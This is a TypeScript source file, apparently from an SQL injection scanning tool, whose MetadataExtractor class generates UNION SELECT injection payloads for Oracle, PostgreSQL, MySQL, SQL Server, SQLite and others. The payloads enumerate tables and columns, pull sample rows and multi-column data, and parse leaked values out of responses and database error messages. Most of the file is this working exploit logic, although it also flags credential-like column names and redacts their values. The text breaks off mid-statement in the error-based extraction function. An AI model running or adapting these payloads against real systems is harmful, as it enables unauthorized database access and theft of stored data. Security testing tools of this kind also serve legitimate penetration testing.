import {
  DbmsType,
  ColumnMetadata,
  CandidateParameter,
} from '../../types/sqlScanner';

export class MetadataExtractor {
  public static DELIMITER_START = '~SNT_';
  public static DELIMITER_END = '_SNT~';

  private static SENSITIVE_COLUMN_PATTERNS = [
    /password/i,
    /passwd/i,
    /pwd/i,
    /pass_hash/i,
    /secret/i,
    /token/i,
    /api[_-]?key/i,
    /auth/i,
    /private_key/i,
    /ssn/i,
    /credit[_-]?card/i,
    /cvv/i,
  ];

  private static ORACLE_SYSTEM_OBJECT_PREFIXES = [
    'SYS', 'SYSTEM', 'DUAL', 'DR$', 'DR_', 'SDO_', 'SDO$', 'XDB$', 'XDB_',
    'WRI$_', 'WRI_', 'APEX_', 'FLOWS_', 'MDSYS', 'CTXSYS', 'AUDSYS', 'OUTLN',
    'ORDSYS', 'DVSYS', 'GSMADMIN', 'OLAPSYS', 'HS$', 'HS_', 'IMPDP_', 'KU$',
    'KU_', 'NTV2_', 'ODCI_', 'OGIS_', 'OL$', 'PLAN_TABLE', 'PSTUB', 'SRS',
    'STMT_', 'TABLE_PRIVILEGE', 'WRR$', 'WRR_', 'WWV_', 'AQ$', 'BIN$', 'DEF$',
    'LOGMNR', 'REPCAT$', 'ROLLING$', 'SMP_', 'MGMT_', 'EXFSYS', 'LBACSYS',
    'DBSNMP', 'WMSYS', 'APPQOSSYS', 'OJVMSYS',
    // Additional Oracle internal tables
    'AUDIT_', 'APP_ROLE', 'APP_USERS', 'HELP',
  ];

  /**
   * Decodes common HTML entity representations (e.g. &apos;, &#39;, &quot;)
   */
  public static decodeHtmlEntities(str: string): string {
    if (!str) return '';
    return str
      .replace(/&apos;/gi, "'")
      .replace(/&#39;/g, "'")
      .replace(/&#x27;/gi, "'")
      .replace(/&quot;/gi, '"')
      .replace(/&#34;/g, '"')
      .replace(/&amp;/gi, '&')
      .replace(/&#38;/g, '&')
      .replace(/&lt;/gi, '<')
      .replace(/&#60;/g, '<')
      .replace(/&gt;/gi, '>')
      .replace(/&#62;/g, '>')
      .replace(/&nbsp;/gi, ' ')
      .trim();
  }

  /**
   * Validates if a string is a genuine database version output rather than an echoed SQL query
   */
  public static isValidVersionString(str: string): boolean {
    if (!str) return false;
    const clean = MetadataExtractor.decodeHtmlEntities(str).trim();
    if (clean.length < 2 || clean.length > 512) return false;

    // Reject if it contains explicit SQL injection statement structures (which indicates payload echo)
    if (
      /\bSELECT\s+/i.test(clean) ||
      /\bFROM\s+DUAL\b/i.test(clean) ||
      /\bFROM\s+v\$version\b/i.test(clean) ||
      /\bFROM\s+information_schema\b/i.test(clean) ||
      /\bUNION\s+SELECT\b/i.test(clean) ||
      /\bUNION\s+ALL\b/i.test(clean) ||
      clean.includes('||') ||
      clean.includes('--') ||
      clean.includes('/*') ||
      clean.includes('*/')
    ) {
      return false;
    }

    return true;
  }

  /**
   * Attempts to extract a normalized DBMS version string from response text
   */
  public static extractVersionFromText(responseBody: string, dbms: DbmsType): string | undefined {
    if (!responseBody) return undefined;

    if (dbms === 'Oracle') {
      const match = responseBody.match(/Oracle\s+Database\s+([^\n\r<]{3,80})/i) ||
                    responseBody.match(/\b(Oracle\s+\d+c\s+[^\n\r<]{3,60})/i) ||
                    responseBody.match(/\b(19c|21c|23c|18c|12c|11g|10g)\b/i);
      if (match) {
        const v = match[0].trim();
        if (MetadataExtractor.isValidVersionString(v)) return v;
      }
    } else if (dbms === 'PostgreSQL') {
      const match = responseBody.match(/PostgreSQL\s+(\d+[\.\d]*[^\n\r<]{0,40})/i);
      if (match) {
        const v = match[0].trim();
        if (MetadataExtractor.isValidVersionString(v)) return v;
      }
    } else if (dbms === 'MySQL' || dbms === 'MariaDB') {
      const match = responseBody.match(/\b(\d+\.\d+\.\d+-(?:MariaDB|MySQL|[a-zA-Z0-9_\-\.]+))/i) ||
                    responseBody.match(/\b(MySQL|MariaDB)\s+(\d+\.\d+\.\d+)/i);
      if (match) {
        const v = match[0].trim();
        if (MetadataExtractor.isValidVersionString(v)) return v;
      }
    } else if (dbms === 'Microsoft SQL Server') {
      const match = responseBody.match(/Microsoft\s+SQL\s+Server\s+(\d+[\.\d\w\s\(\)\-]+)/i);
      if (match) {
        const v = match[0].trim();
        if (MetadataExtractor.isValidVersionString(v)) return v;
      }
    } else if (dbms === 'SQLite') {
      const match = responseBody.match(/SQLite\s+(?:version\s+)?(\d+\.\d+\.\d+)/i);
      if (match) {
        const v = match[0].trim();
        if (MetadataExtractor.isValidVersionString(v)) return v;
      }
    }

    return undefined;
  }

  /**
   * Validates if a string is a clean, genuine SQL identifier (table/column name)
   */
  public static isValidIdentifier(name: string): boolean {
    if (!name) return false;
    const clean = MetadataExtractor.decodeHtmlEntities(name).trim();
    if (clean.length === 0 || clean.length > 128) return false;
    if (/['"|;+&<>\s\\]/.test(clean)) return false;

    const upper = clean.toUpperCase();
    if (
      upper === 'TABLE_NAME' ||
      upper === 'COLUMN_NAME' ||
      upper === 'NULL' ||
      upper === 'DUAL' ||
      upper.includes('DELIMITER') ||
      upper.includes('APOS') ||
      upper.startsWith('&')
    ) {
      return false;
    }

    const htmlNavigationNoise = new Set([
      'LAB', 'HOME', 'ALL', 'GIFTS', 'PETS', 'LIFESTYLE', 'TECH', 'FOOD', 'DRINK',
      'MY_ACCOUNT', 'LOGIN', 'CART', 'LOGOUT', 'SHOP', 'SEARCH', 'FILTER', 'SUBMIT',
      'REGISTER', 'CONTACT', 'ABOUT', 'HEADER', 'FOOTER', 'NAVBAR', 'BANNER', 'BUTTON',
      'CATEGORIES', 'VIEW_DETAILS'
    ]);
    if (htmlNavigationNoise.has(upper)) {
      return false;
    }

    return /^[A-Za-z0-9_#$]+$/.test(clean);
  }

  /**
   * Evaluates if an object is sensitive based on name pattern
   */
  public static isSensitiveName(name: string): { isSensitive: boolean; reason?: string } {
    const clean = MetadataExtractor.decodeHtmlEntities(name);
    for (const pattern of MetadataExtractor.SENSITIVE_COLUMN_PATTERNS) {
      if (pattern.test(clean)) {
        return {
          isSensitive: true,
          reason: `Column name matches credential/token pattern (${pattern.toString()})`,
        };
      }
    }
    return { isSensitive: false };
  }

  /**
   * Classifies table into APPLICATION vs SYSTEM / INTERNAL based on DBMS naming conventions
   */
  public static classifyTable(tableName: string, schemaName?: string, dbms?: DbmsType): 'application' | 'system' | 'internal' | 'unknown' {
    const upperName = MetadataExtractor.decodeHtmlEntities(tableName).toUpperCase();
    const upperSchema = (schemaName || '').toUpperCase();

    if (!MetadataExtractor.isValidIdentifier(upperName)) {
      return 'system';
    }

    const standardSystemTables = new Set([
      'SCHEMATA', 'TABLES', 'COLUMNS', 'VIEWS', 'ROUTINES', 'PARAMETERS',
      'ATTRIBUTES', 'TRIGGERS', 'COLLATIONS', 'CHARACTER_SETS', 'ELEMENT_TYPES',
      'CHECK_CONSTRAINTS', 'TABLE_CONSTRAINTS', 'KEY_COLUMN_USAGE', 'REFERENTIAL_CONSTRAINTS',
      'CONSTRAINT_COLUMN_USAGE', 'CONSTRAINT_TABLE_USAGE', 'CHECK_CONSTRAINT_ROUTINE_USAGE',
      'VIEW_COLUMN_USAGE', 'VIEW_TABLE_USAGE', 'VIEW_ROUTINE_USAGE', 'DOMAIN_CONSTRAINTS',
      'DOMAINS', 'DOMAIN_UDT_USAGE', 'DATA_TYPE_PRIVILEGES', 'USER_DEFINED_TYPES',
      'UDT_PRIVILEGES', 'USAGE_PRIVILEGES', 'TABLE_PRIVILEGES', 'COLUMN_PRIVILEGES',
      'ROUTINE_PRIVILEGES', 'ROLE_USAGE_GRANTS', 'ROLE_TABLE_GRANTS', 'ROLE_COLUMN_GRANTS',
      'ROLE_ROUTINE_GRANTS', 'ROLE_UDT_GRANTS', 'APPLICABLE_ROLES', 'ADMINISTRABLE_ROLE_AUTHORIZATIONS',
      'ENABLED_ROLES', 'USER_MAPPINGS', 'USER_MAPPING_OPTIONS', 'FOREIGN_TABLES',
      'FOREIGN_TABLE_OPTIONS', 'FOREIGN_SERVERS', 'FOREIGN_SERVER_OPTIONS',
      'FOREIGN_DATA_WRAPPERS', 'FOREIGN_DATA_WRAPPER_OPTIONS', 'COLUMN_OPTIONS',
      'COLUMN_DOMAIN_USAGE', 'COLUMN_UDT_USAGE', 'COLUMN_COLUMN_USAGE', 'TRIGGERED_UPDATE_COLUMNS',
      'SQL_FEATURES', 'SQL_IMPLEMENTATION_INFO', 'SQL_LANGUAGES', 'SQL_PACKAGES',
      'SQL_PARTS', 'SQL_SIZING', 'SQL_SIZING_PROFILES', 'INFORMATION_SCHEMA_CATALOG_NAME',
      'SEQUENCES', 'COLLATION_CHARACTER_SET_APPLICABILITY', 'DIRECT_SUPEROBJECTS', 'DIRECT_SUPERTABLES',
      'DIRECT_SUPERTYPES', 'FIELDS', 'METADATA', 'OPERATOR_PRIVILEGES', 'PROFILING',
      'ROUTINE_COLUMN_USAGE', 'SCHEMATA_EXTENSIONS', 'SCHEMA_PRIVILEGES', 'SYSTEM_COLUMNS',
      'SYSTEM_TABLES', 'TRIGGER_PRIVILEGES', 'USER_ATTRIBUTES', 'USER_PRIVILEGES'
    ]);
    if (standardSystemTables.has(upperName)) {
      return 'system';
    }

    if (dbms === 'Oracle') {
      if (upperName === 'DUAL') return 'system';
      for (const prefix of MetadataExtractor.ORACLE_SYSTEM_OBJECT_PREFIXES) {
        if (upperName.startsWith(prefix) || upperSchema.startsWith(prefix)) {
          return 'system';
        }
      }
      if (upperName.includes('$') || upperName.startsWith('BIN$')) {
        return 'system';
      }
    }

    if (dbms === 'PostgreSQL') {
      if (upperSchema === 'INFORMATION_SCHEMA' || upperSchema === 'PG_CATALOG' || upperName.startsWith('PG_')) {
        return 'system';
      }
    }

    if (dbms === 'MySQL' || dbms === 'MariaDB') {
      if (upperSchema === 'INFORMATION_SCHEMA' || upperSchema === 'PERFORMANCE_SCHEMA' || upperSchema === 'MYSQL' || upperSchema === 'SYS') {
        return 'system';
      }
    }

    if (dbms === 'Microsoft SQL Server') {
      if (upperSchema === 'SYS' || upperSchema === 'INFORMATION_SCHEMA' || upperName.startsWith('MS_') || upperName.startsWith('SPT_')) {
        return 'system';
      }
    }

    if (dbms === 'SQLite') {
      if (upperName === 'SQLITE_SEQUENCE' || upperName === 'SQLITE_MASTER' || upperName === 'SQLITE_STAT1') {
        return 'system';
      }
    }

    return 'application';
  }

  /**
   * Extracts tokens wrapped between custom delimiter tags in response text
   */
  public static extractDelimitedTokens(responseBody: string, tag: string): string[] {
    const startTag = `${MetadataExtractor.DELIMITER_START}${tag}:`;
    const endTag = `:${tag}${MetadataExtractor.DELIMITER_END}`;
    const results: string[] = [];

    const rawMatches: string[] = [];
    let searchIdx = 0;
    while (true) {
      const sIdx = responseBody.indexOf(startTag, searchIdx);
      if (sIdx === -1) break;
      const contentStart = sIdx + startTag.length;
      const eIdx = responseBody.indexOf(endTag, contentStart);
      if (eIdx === -1) break;

      const rawVal = responseBody.substring(contentStart, eIdx).trim();
      if (rawVal) {
        rawMatches.push(rawVal);
      }
      searchIdx = eIdx + endTag.length;
    }

    for (const raw of rawMatches) {
      const decoded = MetadataExtractor.decodeHtmlEntities(raw);
      if (decoded && !results.includes(decoded)) {
        results.push(decoded);
      }
    }

    return results;
  }

  /**
   * Resiliently extracts database object names directly from HTML tags (<th>, <td>, <li>)
   */
  public static extractHtmlOrTextTokens(responseBody: string, baselineText?: string): string[] {
    if (!responseBody) return [];
    const results: string[] = [];
    const seen = new Set<string>();

    const baselineSet = new Set<string>();
    if (baselineText) {
      const baseMatches = baselineText.match(/<(?:th|td|li|p|span|div|a)[^>]*>\s*([a-zA-Z0-9_#$]{2,64})\s*<\/(?:th|td|li|p|span|div|a)>/gi) || [];
      for (const m of baseMatches) {
        const clean = m.replace(/<[^>]+>/g, '').trim().toLowerCase();
        if (clean) baselineSet.add(clean);
      }
    }

    const htmlTagRegex = /<(?:th|td|li|p|span|div|a)[^>]*>\s*([a-zA-Z0-9_#$]{2,64})\s*<\/(?:th|td|li|p|span|div|a)>/gi;
    let match: RegExpExecArray | null;
    while ((match = htmlTagRegex.exec(responseBody)) !== null) {
      const candidate = match[1].trim();
      if (MetadataExtractor.isValidIdentifier(candidate)) {
        if (!baselineSet.has(candidate.toLowerCase())) {
          if (!seen.has(candidate)) {
            seen.add(candidate);
            results.push(candidate);
          }
        }
      }
    }
    return results;
  }

  /**
   * Builds delimiter-wrapped expression for string concatenation in SQL
   */
  public static wrapWithDelimiters(selectExpression: string, tag: string, dbms: DbmsType): string {
    const prefix = `'${MetadataExtractor.DELIMITER_START}${tag}:'`;
    const suffix = `':${tag}${MetadataExtractor.DELIMITER_END}'`;

    if (dbms === 'Oracle' || dbms === 'PostgreSQL' || dbms === 'SQLite' || dbms === 'IBM Db2' || dbms === 'H2') {
      return `${prefix}||${selectExpression}||${suffix}`;
    }
    if (dbms === 'Microsoft SQL Server') {
      return `${prefix}+${selectExpression}+${suffix}`;
    }
    if (dbms === 'MySQL' || dbms === 'MariaDB') {
      return `CONCAT(${prefix},${selectExpression},${suffix})`;
    }
    if (dbms === 'Microsoft Access') {
      return `${prefix}&${selectExpression}&${suffix}`;
    }

    return `${prefix}||${selectExpression}||${suffix}`;
  }

  /**
   * Generates dynamic query payloads for application table enumeration (e.g. user_tables in Oracle)
   */
  public static getTableEnumerationQuery(
    param: CandidateParameter,
    renderColumn: number,
    columnCount: number,
    dbms: DbmsType
  ): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';

    const nullPadded = (wrappedExpr: string, fromClause: string) => {
      const parts: string[] = [];
      for (let i = 1; i <= columnCount; i++) {
        if (i === renderColumn) parts.push(wrappedExpr);
        else parts.push('NULL');
      }
      return `${unionPrefix}${parts.join(',')} ${fromClause}`;
    };

    if (dbms === 'Oracle') {
      const wrapped = MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'Oracle');
      return nullPadded(wrapped, 'FROM user_tables WHERE ROWNUM<=30--');
    }

    if (dbms === 'PostgreSQL') {
      const wrapped = MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'PostgreSQL');
      return nullPadded(wrapped, "FROM information_schema.tables WHERE table_schema='public' LIMIT 30-- -");
    }

    if (dbms === 'MySQL' || dbms === 'MariaDB') {
      const wrapped = MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'MySQL');
      return nullPadded(wrapped, 'FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 30-- -');
    }

    if (dbms === 'Microsoft SQL Server') {
      const wrapped = MetadataExtractor.wrapWithDelimiters('name', 'TBL', 'Microsoft SQL Server');
      return nullPadded(wrapped, 'FROM sys.tables--');
    }

    if (dbms === 'SQLite') {
      const wrapped = MetadataExtractor.wrapWithDelimiters('name', 'TBL', 'SQLite');
      return nullPadded(wrapped, "FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 30-- -");
    }

    if (dbms === 'IBM Db2') {
      const wrapped = MetadataExtractor.wrapWithDelimiters('tabname', 'TBL', 'IBM Db2');
      return nullPadded(wrapped, 'FROM syscat.tables WHERE tabschema=CURRENT USER FETCH FIRST 30 ROWS ONLY--');
    }

    if (dbms === 'H2') {
      const wrapped = MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'H2');
      return nullPadded(wrapped, "FROM information_schema.tables WHERE table_schema='PUBLIC' LIMIT 30-- -");
    }

    const wrapped = MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'Generic SQL');
    return nullPadded(wrapped, 'FROM information_schema.tables LIMIT 30-- -');
  }

  /**
   * Generates dynamic query payloads for all accessible tables (all_tables in Oracle)
   */
  public static getAllTablesEnumerationQuery(
    param: CandidateParameter,
    renderColumn: number,
    columnCount: number,
    dbms: DbmsType
  ): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';

    const nullPadded = (wrappedExpr: string, fromClause: string) => {
      const parts: string[] = [];
      for (let i = 1; i <= columnCount; i++) {
        if (i === renderColumn) parts.push(wrappedExpr);
        else parts.push('NULL');
      }
      return `${unionPrefix}${parts.join(',')} ${fromClause}`;
    };

    if (dbms === 'Oracle') {
      const wrapped = MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'Oracle');
      return nullPadded(wrapped, 'FROM all_tables WHERE ROWNUM<=100--');
    }

    if (dbms === 'PostgreSQL') {
      const wrapped = MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'PostgreSQL');
      return nullPadded(wrapped, 'FROM information_schema.tables LIMIT 200-- -');
    }

    if (dbms === 'MySQL' || dbms === 'MariaDB') {
      const wrapped = MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'MySQL');
      return nullPadded(wrapped, 'FROM information_schema.tables LIMIT 200-- -');
    }

    if (dbms === 'Microsoft SQL Server') {
      const wrapped = MetadataExtractor.wrapWithDelimiters('name', 'TBL', 'Microsoft SQL Server');
      return nullPadded(wrapped, 'FROM sys.objects WHERE type IN (\'U\',\'V\',\'S\')--');
    }

    if (dbms === 'SQLite') {
      const wrapped = MetadataExtractor.wrapWithDelimiters('name', 'TBL', 'SQLite');
      return nullPadded(wrapped, 'FROM sqlite_master WHERE type IN (\'table\',\'view\')-- -');
    }

    const wrapped = MetadataExtractor.wrapWithDelimiters('table_name', 'TBL', 'Generic SQL');
    return nullPadded(wrapped, 'FROM information_schema.tables LIMIT 200-- -');
  }

  /**
   * Generates dynamic query for column enumeration of a target table
   */
  public static getColumnEnumerationQuery(
    param: CandidateParameter,
    renderColumn: number,
    columnCount: number,
    tableName: string,
    dbms: DbmsType
  ): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const cleanTable = MetadataExtractor.decodeHtmlEntities(tableName).replace(/['"]/g, '');

    const nullPadded = (wrappedExpr: string, fromClause: string) => {
      const parts: string[] = [];
      for (let i = 1; i <= columnCount; i++) {
        if (i === renderColumn) parts.push(wrappedExpr);
        else parts.push('NULL');
      }
      return `${unionPrefix}${parts.join(',')} ${fromClause}`;
    };

    if (dbms === 'Oracle') {
      const wrapped = MetadataExtractor.wrapWithDelimiters("column_name||'|'||data_type", 'COL', 'Oracle');
      return nullPadded(wrapped, `FROM all_tab_columns WHERE table_name=UPPER('${cleanTable}') AND ROWNUM<=30--`);
    }

    if (dbms === 'PostgreSQL') {
      const wrapped = MetadataExtractor.wrapWithDelimiters("column_name||'|'||data_type", 'COL', 'PostgreSQL');
      return nullPadded(wrapped, `FROM information_schema.columns WHERE table_name='${cleanTable}' LIMIT 30-- -`);
    }

    if (dbms === 'MySQL' || dbms === 'MariaDB') {
      const wrapped = MetadataExtractor.wrapWithDelimiters("CONCAT(column_name,'|',data_type)", 'COL', 'MySQL');
      return nullPadded(wrapped, `FROM information_schema.columns WHERE table_name='${cleanTable}' LIMIT 30-- -`);
    }

    if (dbms === 'Microsoft SQL Server') {
      const wrapped = MetadataExtractor.wrapWithDelimiters("COLUMN_NAME+'|'+DATA_TYPE", 'COL', 'Microsoft SQL Server');
      return nullPadded(wrapped, `FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='${cleanTable}'--`);
    }

    if (dbms === 'SQLite') {
      const wrapped = MetadataExtractor.wrapWithDelimiters("name||'|'||type", 'COL', 'SQLite');
      return nullPadded(wrapped, `FROM pragma_table_info('${cleanTable}') LIMIT 30-- -`);
    }

    const wrapped = MetadataExtractor.wrapWithDelimiters("column_name||'|'||data_type", 'COL', 'Generic SQL');
    return nullPadded(wrapped, `FROM information_schema.columns WHERE table_name='${cleanTable}' LIMIT 30-- -`);
  }

  /**
   * Generates dynamic query for live sample row retrieval from a target table
   */
  public static getSampleRowsQuery(
    param: CandidateParameter,
    renderColumn: number,
    columnCount: number,
    tableName: string,
    columnNames: string[],
    dbms: DbmsType
  ): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const cleanTable = MetadataExtractor.decodeHtmlEntities(tableName).replace(/['"]/g, '');
    const cleanCols = columnNames.map((c) => MetadataExtractor.decodeHtmlEntities(c).replace(/['"]/g, ''));

    if (cleanCols.length === 0) return '';

    let colConcatExpr = '';
    if (dbms === 'Oracle' || dbms === 'PostgreSQL' || dbms === 'SQLite' || dbms === 'IBM Db2' || dbms === 'H2') {
      colConcatExpr = cleanCols.map((c) => `NVL(TO_CHAR(${c}),'[NULL]')`).join("||'#'||");
      if (dbms === 'PostgreSQL' || dbms === 'SQLite') {
        colConcatExpr = cleanCols.map((c) => `COALESCE(${c}::text,'[NULL]')`).join("||'#'||");
      }
    } else if (dbms === 'Microsoft SQL Server') {
      colConcatExpr = cleanCols.map((c) => `ISNULL(CAST(${c} AS VARCHAR(MAX)),'[NULL]')`).join("+'#'+");
    } else if (dbms === 'MySQL' || dbms === 'MariaDB') {
      const items = cleanCols.map((c) => `IFNULL(${c},'[NULL]')`).join(",'#',");
      colConcatExpr = `CONCAT(${items})`;
    } else {
      colConcatExpr = cleanCols.join("||'#'||");
    }

    const wrapped = MetadataExtractor.wrapWithDelimiters(colConcatExpr, 'ROW', dbms);
    const parts: string[] = [];
    for (let i = 1; i <= columnCount; i++) {
      if (i === renderColumn) parts.push(wrapped);
      else parts.push('NULL');
    }

    let limitClause = '';
    if (dbms === 'Oracle') limitClause = 'WHERE ROWNUM<=10--';
    else if (dbms === 'Microsoft SQL Server') limitClause = '--';
    else limitClause = 'LIMIT 10-- -';

    return `${unionPrefix}${parts.join(',')} FROM ${cleanTable} ${limitClause}`;
  }

  /**
   * Parses column tokens (e.g. "USERNAME|VARCHAR2") into structured ColumnMetadata
   */
  public static parseColumnTokens(tokens: string[]): ColumnMetadata[] {
    const cols: ColumnMetadata[] = [];
    const seenNames = new Set<string>();

    for (const t of tokens) {
      if (!t) continue;
      const parts = t.split('|');
      const name = parts[0]?.trim();
      const dataType = (parts[1]?.trim() || 'VARCHAR2').toUpperCase();

      if (!name || !MetadataExtractor.isValidIdentifier(name) || seenNames.has(name.toUpperCase())) {
        continue;
      }

      seenNames.add(name.toUpperCase());
      const sensitivity = MetadataExtractor.isSensitiveName(name);

      cols.push({
        name,
        dataType,
        isNullable: true,
        isPrimaryKey: name.toUpperCase() === 'ID' || name.toUpperCase().endsWith('_ID'),
        isForeignKey: false,
        isIndexed: name.toUpperCase() === 'ID' || name.toUpperCase().includes('INDEX'),
        isSensitive: sensitivity.isSensitive,
        sensitivityReason: sensitivity.reason,
        confidence: 'Confirmed',
        evidence: `Extracted via data dictionary query (${dataType})`,
        discoveredAt: Date.now(),
      });
    }

    return cols;
  }

  /**
   * Parses and redacts sample row tokens into key-value records
   */
  public static parseAndRedactSampleRows(
    rowTokens: string[],
    columnNames: string[]
  ): Record<string, string>[] {
    const rows: Record<string, string>[] = [];

    for (const token of rowTokens) {
      if (!token) continue;
      const cells = token.split('#');
      const rowObj: Record<string, string> = {};

      for (let i = 0; i < columnNames.length; i++) {
        const colName = columnNames[i];
        const rawVal = cells[i] !== undefined ? cells[i].trim() : '[NULL]';
        const isSens = MetadataExtractor.isSensitiveName(colName).isSensitive;

        if (isSens && rawVal !== '[NULL]' && rawVal !== '') {
          rowObj[colName] = '[REDACTED]';
        } else {
          rowObj[colName] = rawVal === '[NULL]' ? 'NULL' : rawVal;
        }
      }

      rows.push(rowObj);
    }

    return rows;
  }

  /**
   * Generates clean, standard UNION query for table enumeration without delimiters
   */
  public static getCleanTableEnumerationQuery(
    param: CandidateParameter,
    renderColumn: number,
    columnCount: number,
    dbms: DbmsType
  ): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';

    const nullPadded = (expr: string, fromClause: string) => {
      const parts: string[] = [];
      for (let i = 1; i <= columnCount; i++) {
        if (i === renderColumn) parts.push(expr);
        else parts.push('NULL');
      }
      return `${unionPrefix}${parts.join(',')} ${fromClause}`;
    };

    if (dbms === 'Oracle') {
      return nullPadded('table_name', 'FROM all_tables--');
    }
    if (dbms === 'PostgreSQL') {
      return nullPadded('table_name', 'FROM information_schema.tables--');
    }
    if (dbms === 'MySQL' || dbms === 'MariaDB') {
      return nullPadded('table_name', 'FROM information_schema.tables--');
    }
    if (dbms === 'Microsoft SQL Server') {
      return nullPadded('name', 'FROM sys.tables--');
    }
    if (dbms === 'SQLite') {
      return nullPadded('name', "FROM sqlite_master WHERE type='table'-- -");
    }
    return nullPadded('table_name', 'FROM information_schema.tables--');
  }

  /**
   * Generates clean, standard UNION query for column enumeration without delimiters
   */
  public static getCleanColumnEnumerationQuery(
    param: CandidateParameter,
    renderColumn: number,
    columnCount: number,
    tableName: string,
    dbms: DbmsType
  ): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const cleanTable = MetadataExtractor.decodeHtmlEntities(tableName).replace(/['"]/g, '');

    const nullPadded = (expr: string, fromClause: string) => {
      const parts: string[] = [];
      for (let i = 1; i <= columnCount; i++) {
        if (i === renderColumn) parts.push(expr);
        else parts.push('NULL');
      }
      return `${unionPrefix}${parts.join(',')} ${fromClause}`;
    };

    if (dbms === 'Oracle') {
      return nullPadded('column_name', `FROM all_tab_columns WHERE table_name=UPPER('${cleanTable}')--`);
    }
    if (dbms === 'PostgreSQL' || dbms === 'MySQL' || dbms === 'MariaDB') {
      return nullPadded('column_name', `FROM information_schema.columns WHERE table_name='${cleanTable}'--`);
    }
    if (dbms === 'Microsoft SQL Server') {
      return nullPadded('name', `FROM sys.columns WHERE object_id=OBJECT_ID('${cleanTable}')--`);
    }
    if (dbms === 'SQLite') {
      return nullPadded('sql', `FROM sqlite_master WHERE name='${cleanTable}'-- -`);
    }
    return nullPadded('column_name', `FROM information_schema.columns WHERE table_name='${cleanTable}'--`);
  }

  /**
   * Generates clean, standard UNION query for sample rows extraction
   */
  public static getCleanSampleRowsQuery(
    param: CandidateParameter,
    columnCount: number,
    tableName: string,
    columnNames: string[]
  ): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const cleanTable = MetadataExtractor.decodeHtmlEntities(tableName).replace(/['"]/g, '');

    const parts: string[] = [];
    for (let i = 0; i < columnCount; i++) {
      if (i < columnNames.length) {
        parts.push(columnNames[i]);
      } else {
        parts.push('NULL');
      }
    }
    return `${unionPrefix}${parts.join(',')} FROM ${cleanTable}--`;
  }

  /**
   * Generates precision UNION query to extract a single column safely in the verified render column position
   */
  public static getSingleColumnExtractionQuery(
    param: CandidateParameter,
    renderColumn: number,
    columnCount: number,
    tableName: string,
    columnName: string,
    dbms: DbmsType,
    isSystemTable: boolean = false
  ): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const cleanTable = MetadataExtractor.decodeHtmlEntities(tableName).replace(/['"]/g, '');
    const cleanCol = MetadataExtractor.decodeHtmlEntities(columnName).replace(/['"]/g, '');

    const tableRef = isSystemTable && !cleanTable.includes('.') ? `information_schema.${cleanTable}` : cleanTable;

    const parts: string[] = [];
    for (let i = 1; i <= (columnCount || 2); i++) {
      if (i === (renderColumn || 1)) {
        parts.push(cleanCol);
      } else {
        parts.push('NULL');
      }
    }

    if (dbms === 'Oracle') {
      return `${unionPrefix}${parts.join(',')} FROM ${tableRef}--`;
    }
    return `${unionPrefix}${parts.join(',')} FROM ${tableRef}--`;
  }

  /**
   * Generates precision UNION query to concatenate and extract multiple columns safely in the verified render column
   */
  public static getMultiColumnExtractionQuery(
    param: CandidateParameter,
    renderColumn: number,
    columnCount: number,
    tableName: string,
    columnNames: string[],
    dbms: DbmsType,
    isSystemTable: boolean = false
  ): string {
    const isNum = /^\d+$/.test(param.originalValue.trim());
    const unionPrefix = isNum ? ' UNION SELECT ' : '\' UNION SELECT ';
    const cleanTable = MetadataExtractor.decodeHtmlEntities(tableName).replace(/['"]/g, '');
    const cleanCols = columnNames.map((c) => MetadataExtractor.decodeHtmlEntities(c).replace(/['"]/g, ''));

    const tableRef = isSystemTable && !cleanTable.includes('.') ? `information_schema.${cleanTable}` : cleanTable;

    let concatExpr = '';
    if (cleanCols.length === 1) {
      concatExpr = cleanCols[0];
    } else if (dbms === 'MySQL' || dbms === 'MariaDB') {
      concatExpr = `CONCAT(${cleanCols.join(",' ~ ',")})`;
    } else if (dbms === 'Microsoft SQL Server') {
      concatExpr = cleanCols.map((c) => `CAST(${c} AS VARCHAR(MAX))`).join("+' ~ '+");
    } else {
      concatExpr = cleanCols.map((c) => `COALESCE(${c}::text,'[NULL]')`).join("||' ~ '||");
    }

    const parts: string[] = [];
    for (let i = 1; i <= (columnCount || 2); i++) {
      if (i === (renderColumn || 1)) {
        parts.push(concatExpr);
      } else {
        parts.push('NULL');
      }
    }

    if (dbms === 'Oracle') {
      return `${unionPrefix}${parts.join(',')} FROM ${tableRef}--`;
    }
    return `${unionPrefix}${parts.join(',')} FROM ${tableRef}--`;
  }

  /**
   * Extracts leaked data value from verbose database type conversion and casting error messages
   */
  public static extractErrorBasedData(responseBody: string): string | undefined {
    if (!responseBody) return undefined;

    // 1. PostgreSQL CAST syntax error (including unescaped and HTML-encoded variants)
    // e.g. ERROR: invalid input syntax for type integer: "administrator"
    const pgMatch = responseBody.match(/(?:ERROR:\s*)?invalid input syntax for (?:type\s+)?(?:integer|numeric|int|smallint|bigint|boolean|uuid|date|timestamp):\s*["']([^"'\r\n<]+)["']/i) ||
